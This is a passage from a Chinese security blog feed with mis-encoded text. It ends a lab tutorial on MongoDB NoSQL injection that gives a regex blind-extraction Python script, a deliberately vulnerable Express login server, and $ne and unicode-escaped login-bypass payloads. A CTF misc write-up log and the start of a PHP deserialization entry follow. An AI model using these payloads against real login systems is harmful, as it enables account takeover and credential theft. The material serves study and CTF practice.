<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#123;$regex:&#x27;.&#123;6&#125;&#x27;&#125;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#123;$regex:&#x27;.&#123;7&#125;&#x27;&#125;&#125;)
&gt;</code></pre>

<p>ç”±äº whoami ç”¨æˆ·çš„ password é•¿åº¦ä¸º 6ï¼Œæ‰€ä»¥æŸ¥è¯¢æ¡ä»¶ <code>&#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#123;$regex:&#39;.&#123;6&#125;&#39;&#125;&#125;</code> ä¸ºçœŸï¼Œä¾¿èƒ½æˆåŠŸç™»å½•ï¼Œè€Œ <code>&#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#123;$regex:&#39;.&#123;7&#125;&#39;&#125;&#125;</code> ä¸ºå‡ï¼Œè‡ªç„¶ä¹Ÿå°±ç™»å½•ä¸äº†ã€‚</p>
<p>çŸ¥é“ password çš„é•¿åº¦ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥é€ä½æå– password çš„å­—ç¬¦äº†ï¼š</p>
<pre><code class="highlight plaintext">username=admin&amp;password[$regex]=1.&#123;5&#125;
username=admin&amp;password[$regex]=12.&#123;4&#125;
username=admin&amp;password[$regex]=123.&#123;3&#125;
username=admin&amp;password[$regex]=1234.&#123;2&#125;
username=admin&amp;password[$regex]=12345.*
username=admin&amp;password[$regex]=123456
æˆ–
username=admin&amp;password[$regex]=^1
username=admin&amp;password[$regex]=^12
username=admin&amp;password[$regex]=^123
username=admin&amp;password[$regex]=^1234
username=admin&amp;password[$regex]=^12345
username=admin&amp;password[$regex]=^123456</code></pre>

<p>è¿™æ˜¯æŸä¸ªå¸ˆå‚…çš„ç›²æ³¨è„šæœ¬ï¼Œè´´ä¸€ä¸‹</p>
<pre><code class="highlight plaintext">import requests
import string

password = &#x27;&#x27;
url = &#x27;http://192.168.226.148/index.php&#x27;

while True:
    for c in string.printable:
        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:

            # When the method is GET
            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)
            # When the method is POST
            post_payload = &#123;
                &quot;username&quot;: &quot;admin&quot;,
                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c
            &#125;
            # When the method is POST with JSON
            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;$regex&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)
            #headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;
            #r = requests.post(url=url, headers=headers, data=json_payload)    # ç®€å•å‘é€ json

            r = requests.post(url=url, data=post_payload)
            if &#x27;Login Success&#x27; in r.text:
                print(&quot;[+] %s&quot; % (password + c))
                password += c


# è¾“å‡ºå¦‚ä¸‹: 
# [+] 1
# [+] 12
# [+] 123
# [+] 1234
# [+] 12345
# [+] 123456</code></pre>

<h3 id="Nodejsä¸­çš„MongoDBæ³¨å…¥"><a href="#Nodejsä¸­çš„MongoDBæ³¨å…¥" class="headerlink" title="Nodejsä¸­çš„MongoDBæ³¨å…¥"></a>Nodejsä¸­çš„MongoDBæ³¨å…¥</h3><p>NodeJSé‡Œé¢çš„Nosqlå°±ä¸»è¦å¼é‡è¨€å¼æ³¨å…¥äº†ï¼Œæ„é€ æ°¸çœŸå¼å¯†ç æ¥å®ç°ç™»é™†ç»•è¿‡</p>
<ul>
<li>server.js</li>
</ul>
<pre><code class="highlight plaintext">var express = require(&#x27;express&#x27;);
var mongoose = require(&#x27;mongoose&#x27;);
var jade = require(&#x27;jade&#x27;);
var bodyParser = require(&#x27;body-parser&#x27;);

mongoose.connect(&#x27;mongodb://localhost/test&#x27;, &#123; useNewUrlParser: true &#125;);
var UserSchema = new mongoose.Schema(&#123;
    name: String,
    username: String,
    password: String
&#125;);
var User = mongoose.model(&#x27;users&#x27;, UserSchema);
var app = express();

app.set(&#x27;views&#x27;, __dirname);
app.set(&#x27;view engine&#x27;, &#x27;jade&#x27;);

app.get(&#x27;/&#x27;, function(req, res) &#123;
    res.render (&quot;index.jade&quot;,&#123;
        message: &#x27;Please Login&#x27;
    &#125;);
&#125;);

app.use(bodyParser.json());

app.post(&#x27;/&#x27;, function(req, res) &#123;
    console.log(req.body)
    User.findOne(&#123;username: req.body.username, password: req.body.password&#125;, function (err, user) &#123;
        console.log(user)
        if (err) &#123;
            return res.render(&#x27;index.jade&#x27;, &#123;message: err.message&#125;);
        &#125;
        if (!user) &#123;
            return res.render(&#x27;index.jade&#x27;, &#123;message: &#x27;Login Failed&#x27;&#125;);
        &#125;

        return res.render(&#x27;index.jade&#x27;, &#123;message: &#x27;Welcome back &#x27; + user.name + &#x27;!&#x27;&#125;);
    &#125;);
&#125;);

var server = app.listen(8000, &#x27;0.0.0.0&#x27;, function () &#123;

    var host = server.address().address
    var port = server.address().port
    console.log(&quot;listening on http://%s:%s&quot;, host, port)
&#125;);
</code></pre>

<ul>
<li>index.jade</li>
</ul>
<pre><code class="highlight plaintext">h1 #&#123;message&#125;
p #&#123;message&#125;</code></pre>

<p>è¿è¡Œè®¿é—®ï¼Œå‘é€</p>
<pre><code class="highlight plaintext">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161641-79e9c82a-ec57-1.png" alt="20210724161641-79e9c82a-ec57-1"></p>
<p>æˆåŠŸç™»å½•</p>
<p>å¦‚æœ<code>$ne</code>å…³é”®å­—è¢«è¿‡æ»¤ä¹Ÿå¯ä»¥ç”¨unicodeæ¥ç»•è¿‡</p>
<p>å› ä¸ºJSONæ˜¯å¯ä»¥ç›´æ¥è§£unicodeçš„</p>
<p>belike:</p>
<pre><code class="highlight plaintext">&#123;&quot;username&quot;:&#123;&quot;\u0024\u006e\u0065&quot;:1&#125;,&quot;password&quot;: &#123;&quot;\u0024\u006e\u0065&quot;:1&#125;&#125;
// &#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></pre>





]]></content>
      <tags>
        <tag>-Web -SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUâ€”MISCåˆ·é¢˜è®°å½•</title>
    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>æµ…æµ…è®°å½•ä¸€ä¸‹BUUé‡Œæ„Ÿè§‰æ¯”è¾ƒæœ‰ä»·å€¼çš„é¢˜ç›®</p>
<h2 id="0è·å…°å®½å¸¦æ³„éœ²"><a href="#0è·å…°å®½å¸¦æ³„éœ²" class="headerlink" title="0è·å…°å®½å¸¦æ³„éœ²"></a>0è·å…°å®½å¸¦æ³„éœ²</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
<p>è§£å‹åå‘ç°ä¸€ä¸ªbinæ–‡ä»¶ï¼Œç¬¬ä¸€æ¬¡ç¢°åˆ°ä¸çŸ¥é“æ€ä¹ˆå¤„ç†ï¼Œçœ‹äº†ä¸€ä¸‹åˆ«çš„å¸ˆå‚…çš„wpäº†è§£åˆ°ä¸€ç§æ–°çš„å·¥å…·ï¼š<code>RouterPassView</code>(ç”¨äºç ´è§£å®½å¸¦æ•°æ®æ–‡ä»¶çš„å¯†ç )ï¼Œé¢˜ç›®æ²¡æœ‰æç¤ºFlag</p>
<p>é‚£è¯•è¯•ç”¨æˆ·å<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
<p>è§£å‹å‘ç°æ˜¯<code>xls</code>æ–‡ä»¶,çŒœæµ‹æ˜¯<code>xls</code>éšå†™</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
<p>ä½†æ˜¯010ä¸€æŸ¥å‘ç°æœ‰pkå¤´,æ”¹åç¼€ä¸€æŸ¥<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
<h2 id="1è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©"><a href="#1è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©" class="headerlink" title="1è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©"></a>1è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©</h2><p>ä¸‹è½½æ˜¯ä¸€ä¸ªæµé‡æ–‡ä»¶ï¼Œç»“åˆæ ‡é¢˜åº”è¯¥æ˜¯æµé‡åŠ«æŒ</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
<p>ä¸»è¦æ˜¯HTTPæµé‡ï¼Œç›´æ¥è¿½è¸ªæµ</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
<p>ç”¨<code>captfencoder</code>MD5ä¸€ä¸‹ç»“æŸæˆ˜æ–—</p>
<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
<h2 id="2è¢«å·èµ°çš„æ–‡ä»¶1"><a href="#2è¢«å·èµ°çš„æ–‡ä»¶1" class="headerlink" title="2è¢«å·èµ°çš„æ–‡ä»¶1"></a>2è¢«å·èµ°çš„æ–‡ä»¶1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
<p>ç”¨<code>foremost</code>åˆ†ç¦»ï¼Œè§£å‹éœ€è¦å¯†ç ï¼Œå…ˆç¡®å®šæµé‡ä¸­æ²¡æœ‰è—å¯†ç ï¼Œå†æš´åŠ›ç ´è§£</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
<h2 id="3è—è—è—"><a href="#3è—è—è—" class="headerlink" title="3è—è—è—"></a>3è—è—è—</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
<p>çœ‹åˆ°å›¾ç‰‡ç»“åˆé¢˜ç›®åï¼Œæ„Ÿè§‰å›¾ç‰‡éšå†™æˆ–è€…å›¾ç‰‡é‡ŒåŒ…å«æ–‡ä»¶<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
<p>é¡ºåˆ©åˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ‰“å¼€æ˜¯ä¸€ä¸ªdocxæ–‡ä»¶ï¼Œéšå†™æ— ç–‘äº†</p>
<p>ç„¶è€Œé‡Œé¢æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼ˆæ‰«å…´å•Šï¼‰ï¼Œç›´æ¥æ‰«å°±å‡ºæ¥äº†</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
<h2 id="4ä½›ç³»é’å¹´"><a href="#4ä½›ç³»é’å¹´" class="headerlink" title="4ä½›ç³»é’å¹´"></a>4ä½›ç³»é’å¹´</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
<p>è§£å‹æ–‡æ¡£éœ€è¦å¯†ç ï¼Œæœ‰ä¸€å¼ <code>png</code>æ˜¯å¯ä»¥æŸ¥çœ‹çš„ï¼Œå…ˆ010æŸ¥ä¸€ä¸‹</p>
<p>æŸ¥å®Œæ²¡æœ‰è—æ–‡ä»¶ï¼Œé‚£åº”è¯¥å°±æ˜¯éšå†™äº†</p>
<p>ç»“æœæ²¡æœ‰å‘ç°éšå†™ï¼Œæ„Ÿè§‰è¢«éª—äº†</p>
<p>çœ‹ä¸€çœ¼å‹ç¼©åŒ…ï¼Œæ˜¯ä¼ªåŠ å¯†ï¼ˆè¿™é‡Œæœ¬æ¥æ²¡çœ‹è§çš„ï¼Œåæ¥ä»”ç»†çœ‹æ‰å‘ç°ï¼Œä¹Ÿç®—å­¦åˆ°ä¸€ç‚¹åˆ†åˆ«ä¼ªåŠ å¯†çš„æ–¹æ³•ï¼‰</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
<p>æ”¹ä¸€ä¸‹è§£å‹ï¼Œæ–‡æœ¬é‡Œå¯ä»¥çœ‹åˆ°ä¸ä½›è®ºç¦…çš„åŠ å¯†ï¼Œç”¨ä¸€ä¸‹éšæ³¢é€æµ<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
<h2 id="5åˆ·æ–°è¿‡çš„å›¾ç‰‡"><a href="#5åˆ·æ–°è¿‡çš„å›¾ç‰‡" class="headerlink" title="5åˆ·æ–°è¿‡çš„å›¾ç‰‡"></a>5åˆ·æ–°è¿‡çš„å›¾ç‰‡</h2><p>é™„ä»¶æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œæé†’åˆ·æ–°ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯ä»€ä¹ˆæ“ä½œï¼Œä»”ç»†æƒ³äº†ä»¥åæ˜¯F5ï¼ˆåˆ·æ–°ï¼‰éšå†™</p>
<p>æŠŠé¡¹ç›®git cloneä¹‹åå‘ç°jdk17ç¯å¢ƒä¸‹è¿è¡Œç›´æ¥æŠ¥é”™ï¼Œæ¢jdk11çœ‹çœ‹<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
<p>æˆåŠŸäº†ï¼Œæ‰“å¼€æå–çš„æ–‡ä»¶å‘ç°æœ‰PKå¤´</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
<p>ä¸€å¼€å§‹å°è¯•ç”¨å¤åˆ¶ç²˜è´´çš„åŠæ³•åœ¨010é‡Œé‡æ–°æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å¤±è´¥ï¼ˆæŠ¥é”™éœ€è¦åˆ†å·ï¼ŒçŒœæµ‹æ˜¯å¤åˆ¶ç²˜è´´çš„è¿‡ç¨‹ä¸­æœ‰äº›å­—ç¬¦æ— æ³•è¢«å¤åˆ¶ï¼‰<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
<p>é‚£ä¹ˆç›´æ¥æ”¹åŸæ–‡ä»¶åç¼€ï¼Œå‹ç¼©åŒ…æ˜¯ä¼ªåŠ å¯†ï¼Œæ‰‹æ”¹æˆ–è€…éšæ³¢é€æµèµ°ä¸€ä¸‹ç»“æŸ</p>
<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
<h2 id="6ç§˜å¯†æ–‡ä»¶"><a href="#6ç§˜å¯†æ–‡ä»¶" class="headerlink" title="6ç§˜å¯†æ–‡ä»¶"></a>6ç§˜å¯†æ–‡ä»¶</h2><p>é™„ä»¶æ˜¯æµé‡ï¼Œwiresharkå¯åŠ¨ï¼</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
<p>foremostå‡ºä¸€ä¸‹ï¼Œè¦å¯†ç ï¼Œå…ˆå°è¯•å¼±å¯†ç çˆ†ç ´</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
<h2 id="7ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥"><a href="#7ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥" class="headerlink" title="7ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥"></a>7ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
<p>çœ‹æ¥æ˜¯æ”¹äº†åç¼€ï¼Œ010å…ˆæŸ¥æŸ¥çœ‹</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
<p>æ¼”éƒ½ä¸æ¼”äº†â€¦</p>
<h2 id="8é¸¡ä½ å¤ªç¾"><a href="#8é¸¡ä½ å¤ªç¾" class="headerlink" title="8é¸¡ä½ å¤ªç¾"></a>8é¸¡ä½ å¤ªç¾</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
<p>ç›¯å®Œå¸§æ²¡æœ‰ä¸œè¥¿ï¼Œçœ‹çœ‹å‰¯æœ¬ï¼Œå‘ç°å·²ç»æŸå</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">ç”¨010ä¸€æŸ¥æ˜¯ç¼ºå°‘æ–‡ä»¶å¤´æ‰‹åŠ¨è¡¥ä¸Š</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
<p>ï¼ˆè¿™é‡Œ-å…¶å®æ˜¯_ï¼‰</p>
<h2 id="9ç¥å¥‡çš„äºŒç»´ç "><a href="#9ç¥å¥‡çš„äºŒç»´ç " class="headerlink" title="9ç¥å¥‡çš„äºŒç»´ç "></a>9ç¥å¥‡çš„äºŒç»´ç </h2><p>é™„ä»¶æ˜¯ä¸€å¼ äºŒç»´ç ï¼Œå…ˆæ‰«æ‰«çœ‹</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
<p>çœ‹æ¥ä¸åœ¨è¿™é‡Œï¼Œç”¨010æŸ¥ä¸€ä¸‹<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
<p>é‡Œé¢è—äº†æ–‡ä»¶ï¼Œç”¨ <code>binwalk</code>åˆ†ç¦»ï¼ˆforemostä¼šåˆ†ä¸å‡ºæ¥ï¼‰</p>
<p>åˆ†å‡ºæ¥å››ä¸ªåŒ…ï¼Œåˆ†åˆ«è§£å‹<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
<p>å…¶ä¸­ä¸€ä¸ªåŒ…è§£å‹æ˜¯ä¸€å¼ jpgå’Œä¸€ä¸ªå‹ç¼©åŒ…ï¼ˆå†…å«ä¸€ä¸ªåŒåjpgï¼‰ï¼Œæœ‰ä¸¤ç§æƒ³æ³•ï¼Œä¸€ç§æ˜¯å‹ç¼©å¯è¯»å›¾ç‰‡ä¸ºå‹ç¼©åŒ…æ˜æ–‡æ”»å‡»ï¼ˆ<code>crc</code>æ ¡éªŒå€¼ç›¸åŒï¼‰ï¼Œå¦ä¸€ç§å°±æ˜¯æš´åŠ›æ‹†åŒ…</p>
<p>å…ˆæš´åŠ›æ‹†åŒ…ï¼Œç»“æœæ˜¾ç¤ºä¸ç»™æ‹†<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
<blockquote>
<p>[!NOTE]</p>
<p>ä»¥ä¸‹ä¸ºå¯¹é¢˜ç›®è€ƒå¯Ÿçš„ä¸æ˜¯æ˜æ–‡æ”»å‡»çš„éªŒè¯ï¼Œå¯ä»¥è·³è¿‡</p>
</blockquote>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
<p>åˆæ­¥çœ‹ä¸€ä¸‹å¤§å°æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆç›´æ¥æŸ¥<code>crc</code>å€¼</p>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨ubuntuæŸ¥ï¼Œä½¿ç”¨<code>crc32</code>å‘½ä»¤</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
crc32 flag.jpg</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
<p>ç»“åˆå‹ç¼©åŒ…çš„crc<code>24A345DA</code>ï¼Œå¾—å‡ºä¸æ˜¯æ˜æ–‡æ”»å‡»</p>
<p>è¿˜æ˜¯çœ‹çœ‹å…¶ä»–å‡ ä¸ªè§£å‹å‡ºæ¥çš„ä¸œè¥¿å§<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
<p>åˆ°ç›®å‰ä¸ºæ­¢æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œçœ‹çœ‹å¦ä¸€ä¸ªåŠ å¯†çš„éŸ³é¢‘æ–‡ä»¶å’Œdocxæ–‡ä»¶<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
<p>è¿™ä¹ˆé•¿çš„base64è¿˜æ˜¯è¦å¿ä¸ä½æƒ³æ˜¯ä¸æ˜¯base64å’Œå›¾åƒä¹‹é—´çš„è½¬æ¢çš„ï¼Œä½†æ˜¯åŒºåŒº8kå­—ç¬¦åŠ ä¸Šè¿˜æœ‰ä¸€ä¸ªæ²¡æœ‰è§£å‹çš„åŒ…ç›´æ¥è®©æˆ‘æ‰“æ¶ˆè¿™ä¸ªå¿µå¤´äº†ï¼Œç›´æ¥<code>basecrack</code>ä¼ºå€™</p>
<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">è§£å‹ä¹‹åï¼Œç”¨Audacityçœ‹ä¸€ä¸‹ï¼Œä¸€çœ¼æ‘©æ–¯</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
<p>æ°´å¹³æœ‰é™ï¼Œè¿˜æ˜¯æ‰‹æ•²ç½¢</p>
<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">å¤§å†™ä¸å¯¹ï¼Œæ¢ä¸ªå°å†™</p>
<p>é‰´å®šä¸ºå›¾ç‰‡çº¯çº¯çš„è¯ˆéª—ï¼ˆæ¼</p>
<h2 id="10æ¢…èŠ±é¦™è‡ªè‹¦å¯’æ¥"><a href="#10æ¢…èŠ±é¦™è‡ªè‹¦å¯’æ¥" class="headerlink" title="10æ¢…èŠ±é¦™è‡ªè‹¦å¯’æ¥"></a>10æ¢…èŠ±é¦™è‡ªè‹¦å¯’æ¥</h2><p>é™„ä»¶æ˜¯ä¸€å¼ <code>png</code>ï¼Œæ²¡æœ‰å…¶ä»–æ˜æ˜¾çš„æç¤ºï¼Œçœ‹ä¸€çœ¼å±æ€§</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
<p>è¦ç”»å›¾ï¼Œé‚£ä¹ˆåº”è¯¥è—äº†åæ ‡ï¼Œ010æŸ¥ä¸€ä¸‹</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
<p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶å°¾è—äº†ä¸€ç§æ•°æ®ï¼Œæ¥ä¸‹æ¥æœ‰ä¸¤ç§æ–¹æ³•</p>
<blockquote>
<p>éšæ³¢é€æµ</p>
</blockquote>
<p>å°†æ–‡ä»¶æ‹–å…¥ä¼šè‡ªåŠ¨æå–å¹¶ä¸”è§£ç ï¼Œå†ç”¨å…¶å†…ç½®çš„åæ ‡ç”»å›¾æœ€ç»ˆå¾—åˆ°ä¸€å¼ åè‰²çš„äºŒç»´ç </p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
<p>è¿™ä¸ªæ—¶å€™ç”¨<code>stegsolve</code>åè‰²å†æ‰«å°±å‡ºæ¥äº†</p>
<blockquote>
<p>è„šæœ¬ç”»å›¾</p>
</blockquote>
<p>é€‰é¦–å°¾ä½ç½®å¤åˆ¶åˆ°è®°äº‹æœ¬ï¼Œå¤åˆ¶åˆ°å¨å­å†hexè§£ç ï¼Œå¾—åˆ°ä¸€ä¸²åæ ‡<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
<p>è´´åˆ°txté‡Œï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç”»å›¾ï¼Œå‚è€ƒäº†åˆ«çš„å¸ˆå‚…çš„wp,æœ‰ä¸¤ç§åšæ³•</p>
<p>â€‹	<code>*gnuplot*</code>ç»˜å›¾</p>
<p>è´´ä¸ªè„šæœ¬å…ˆ</p>
<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # åæ ‡æ ¼å¼æ–‡ä»¶æ¯”å¦‚(7,7)
    re = res.read()
    res.close()
    
with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # å°†è½¬æ¢åçš„åæ ‡å†™å…¥gnuplotTxt.txt
    re = re.split()
    tem = &#x27;&#x27;
    for i in range(0, len(re)):
        tem = re[i]
        tem = tem.lstrip(&#x27;(&#x27;)
        tem = tem.rstrip(&#x27;)&#x27;)
        for j in range(0, len(tem)):
            if tem[j] == &#x27;,&#x27;:
                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
        gnup.write(tem + &#x27;\n&#x27;)
    gnup.close()</code></pre>

<p>å¾—åˆ°å»æ‹¬å·ï¼Œå»é€—å·çš„åæ ‡å€¼</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
<p>è´´ä¸€ä¸‹ubuntuä¸‹çš„ä¸‹è½½å’Œä½¿ç”¨æ–¹æ³•</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
gnuplot
plot <span class="string">&quot;output.txt&quot;</span></code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
<p>å¯ä»¥æ‰«å‡ºæ¥</p>
<p>â€‹	<em>matplotlib</em>ç»˜å›¾</p>
<p>æŠŠåŸæ–‡æœ¬å»æ‹¬å·ï¼Œç”¨è„šæœ¬è·‘</p>
<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
import numpy as np
with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
    re = res.read()
    res.close()

with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # å°†è½¬æ¢åçš„åæ ‡å†™å…¥gnuplotTxt.txt
    re = re.split()
    tem = &#x27;&#x27;
    for i in range(0, len(re)):
        tem = re[i]
        tem = tem.lstrip(&#x27;(&#x27;)
        tem = tem.rstrip(&#x27;)&#x27;)
        gnup.write(tem + &#x27;\n&#x27;)
    gnup.close()
x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
plt.plot(x, y, &#x27;.&#x27;)
plt.show()</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–</title>
    <url>/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
